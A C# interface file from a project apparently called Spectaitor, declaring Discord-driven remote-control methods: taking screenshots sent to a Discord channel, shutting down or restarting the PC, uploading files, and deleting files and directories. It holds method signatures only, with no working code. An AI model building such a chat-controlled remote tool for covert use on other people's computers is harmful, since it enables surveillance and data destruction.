using Discord;
using Discord.WebSocket;
using Spectaitor.Models;

namespace Spectaitor.Services.Interfacess
{
    public interface IDeviceMangerService
    {
        ReturnModel<string> TakeScreenShot(SocketTextChannel Channel);
        void TurnOffPc();
        ReturnModel<string> UploadFile(IAttachment attachment , string path);
        void RestartPc();
        bool RemoveFile(string Path);
        bool RemoveDirectory(string Path);


    }
}
